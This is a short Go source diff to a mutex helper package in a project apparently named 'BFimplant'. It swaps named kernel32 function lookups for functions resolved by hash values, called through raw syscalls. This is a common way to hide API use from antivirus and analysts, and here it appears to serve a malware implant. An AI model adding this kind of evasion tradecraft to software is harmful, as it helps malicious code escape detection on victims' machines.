@@ -3,21 +3,23 @@ package mymutex
 import (
 	"syscall"
 	"unsafe"
+	"BFimplant/winapiV2"
 )
 
 var (
 	kernel32                = syscall.NewLazyDLL("kernel32.dll")
-	procCreateMutexW        = kernel32.NewProc("CreateMutexW")
-	procReleaseMutex        = kernel32.NewProc("ReleaseMutex")
-	procWaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
+	procCreateMutexW        = winapiV2.GetFunctionAddressbyHash("kernel32", 0x8952e903)
+	procReleaseMutex        = winapiV2.GetFunctionAddressbyHash("kernel32", 0x29af2fd9)
+	procWaitForSingleObject = winapiV2.GetFunctionAddressbyHash("kernel32", 0xdf1b3da)
 )
 
 func CreateMutex(name string) (syscall.Handle, error) {
-	handle, _, err := procCreateMutexW.Call(
+	handle, _, err := syscall.SyscallN(procCreateMutexW,
 		0,
 		0,
 		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(name))),
 	)
+
 	if handle == 0 {
 		return 0, err
 	}
@@ -25,7 +27,7 @@ func CreateMutex(name string) (syscall.Handle, error) {
 }
 
 func ReleaseMutex(handle syscall.Handle) error {
-	ret, _, err := procReleaseMutex.Call(uintptr(handle))
+	ret, _, err := syscall.SyscallN(procReleaseMutex,uintptr(handle))
 	if ret == 0 {
 		return err
 	}
@@ -33,9 +35,10 @@ func ReleaseMutex(handle syscall.Handle) error {
 }
 
 func WaitForSingleObject(handle syscall.Handle, milliseconds uint32) (uint32, error) {
-	ret, _, err := procWaitForSingleObject.Call(
+	ret, _, err  :=syscall.SyscallN(procWaitForSingleObject,
 		uintptr(handle),
 		uintptr(milliseconds),
 	)
+	
 	return uint32(ret), err
 }
